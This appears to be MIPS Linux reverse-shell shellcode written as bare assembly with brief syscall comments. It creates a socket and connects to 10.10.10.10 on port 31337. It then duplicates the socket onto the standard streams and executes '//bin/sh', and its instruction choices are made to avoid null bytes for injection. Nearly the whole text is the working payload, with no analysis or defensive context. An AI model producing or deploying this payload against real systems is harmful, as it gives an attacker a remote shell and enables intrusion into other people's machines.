.set noat
li	$t7,-3
nor     $a0,$t7,$zero
nor     $a1,$t7,$zero
slti    $a2,$zero,-1
li      $v0,4183 /*( sys_socket ) */
syscall 0x40404
      
sw      $v0,-1($sp)
lw      $a0,-1($sp)
li      $t7,-3 /*( sa_family = AF_INET ) */
nor     $t7,$t7,$zero
sw	$t7,-30($sp)
lui     $t6,0x697a /*( sin_port = 0x7a69 )*/
ori     $t6,$t6,0x697a
sw      $t6,-28($sp)
          
/* ip address */
lui     $t5,0x0a0a     /*( sin_addr = 0xa0a0 ... */
ori     $t5,$t5,0x0a0a  /*        ...0a0a ) 10.10.10.10*/

       
sw      $t5,-26($sp)
addi    $a1,$sp,-30
li      $t4,-17 /*( addrlen = 16 )    */
nor     $a2,$t4,$zero
li      $v0,4170 /*( sys_connect ) */
syscall 0x40404
      
li      $t7,-3
nor     $a1,$t7,$zero
lw      $a0,-1($sp)
dup2_loop:
  li      $v0,4063 /*( sys_dup2 ) */
  syscall 0x40404
  addi    $a1,$a1,-1
  li      $at,-1
  bne     $a1,$at, dup2_loop
      
  slti    $a2,$zero,-1
  lui     $t7,0x6962     /* ib*/
  ori     $t7,$t7,0x2f2f /* // */
  sw      $t7,-12($sp)
  lui     $t6,0x6873     /* hs */
  ori     $t6,$t6,0x2f6e /* /n */
  sw      $t6,-8($sp)
  sw      $zero,-4($sp)
  addiu   $a0,$sp,-12 /* a0 contains char * "//bin/sh" */
  sw      $a0,-40($sp) /* copy char * to stack for first elem in char ** */
  slti    $a1,$zero,-1 
  sw      $a1,-36($sp) /* copy NULL to stack for second elem in char ** */
  addiu   $a1,$sp,-40 /* load load char **argv into $a1 */
/*  slti    $a1,$zero,-1 */
  li      $v0,4011 /*( sys_execve )*/
  syscall 0x40404
  slti    $a2,$zero,-1 
